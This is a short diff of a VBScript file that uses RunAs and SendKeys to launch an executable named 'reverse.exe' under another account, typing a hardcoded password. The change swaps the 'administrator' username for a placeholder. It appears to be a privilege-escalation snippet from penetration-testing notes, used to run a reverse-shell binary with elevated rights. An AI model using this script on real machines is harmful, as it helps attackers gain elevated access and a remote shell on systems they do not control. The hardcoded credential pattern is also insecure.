@@ -1,5 +1,5 @@
 set oShell = Wscript.CreateObject("WScript.Shell")
-oShell.Run "RunAs /noprofile /user:administrator ""C:\ACCESSIBLE\PATH\reverse.exe"""
+oShell.Run "RunAs /noprofile /user:UserName ""C:\ACCESSIBLE\PATH\reverse.exe"""
 WScript.Sleep 100
 oShell.Sendkeys "P4ssw0rd~"
 Wscript.Quit 
